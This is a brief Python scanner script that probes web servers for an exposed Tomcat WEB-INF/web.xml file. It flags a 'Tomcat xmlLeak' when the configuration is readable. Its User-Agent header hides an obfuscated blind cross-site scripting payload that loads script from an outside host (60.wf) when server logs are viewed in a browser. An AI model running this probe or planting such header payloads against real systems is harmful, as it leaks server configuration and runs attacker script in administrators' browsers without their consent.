#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = w8ay
import requests
import urlparse
import re

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if not url.endswith('/'):
        url = url + "/"
    url = url + "WEB-INF/web.xml"
    try:
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
        r = requests.get(url, headers=header, timeout=5)
        if "<web-app" in r.text and not re.search('<html>.*<head>',r.text,re.I|re.S|re.M):
            return '[Tomcat xmlLeak]'+url
        else:
            return False
    except Exception:
        return False